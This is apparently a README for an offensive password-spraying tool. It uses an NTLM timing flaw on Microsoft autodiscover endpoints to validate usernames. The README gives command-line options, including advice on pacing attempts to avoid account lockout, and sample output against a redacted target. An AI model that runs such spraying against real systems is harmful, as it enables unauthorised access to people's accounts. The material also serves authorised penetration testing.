# 401_spray
password spraying tool that will check for username validation using the Microsoft CAS timing vulnerability found on endpoints using NTLM authentication. Original code can be found here: https://github.com/fang0654/401_spraying. Simply added the ability to check your username list for valid entries.

```python
usage: 401_spray.py [-h] -u USERNAMES -p PASSWORDS [-d DOMAIN] -U URL [-a ATTEMPTS] [-i INTERVAL] [--authtype {ntlm,basic}] [--proxy PROXY] [-t THREADS] [-o OUTPUT] [--add_response] [-v] [-c]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAMES, --usernames USERNAMES
                        List of usernames to attack
  -p PASSWORDS, --passwords PASSWORDS
                        List of passwords to try
  -d DOMAIN, --domain DOMAIN
                        Domain name to append. If not included, then domains will be assumed to be in username list.
  -U URL, --url URL     URL to authenticate against
  -a ATTEMPTS, --attempts ATTEMPTS
                        Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3
  -i INTERVAL, --interval INTERVAL
                        Number of minutes to sleep between attacks. If your lockout policy is per 10 minutes, set this to like 11
  --authtype {ntlm,basic}
                        Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM
  --proxy PROXY         Proxy server to route traffic through
  -t THREADS, --threads THREADS
                        Number of threads
  -o OUTPUT, --output OUTPUT
                        File to write successful pairs to
  --add_response        Add response times to output
  -v, --validate_users  Validates the list of usernames. By default will also run password spraying attack.
  -c, --check_creds     Runs the password spraying attack
```

###Example output:
```Python
New password spraying run
Spraying 1 passwords, then sleeping for 120.
URL: https://autodiscover.<target>.com/autodiscover/autodiscover.xml
[+] auth creds: <target>\aaaaaaz, time elapsed: 0:00:03.850058
[+] auth creds: <target>\bbbbbbz, time elapsed: 0:00:03.648372
[+] auth creds: <target>\ccccccz, time elapsed: 0:00:07.896346
[+] Avg time: 0:00:05.131592
[*] Threshold: 0:00:03.078955
```
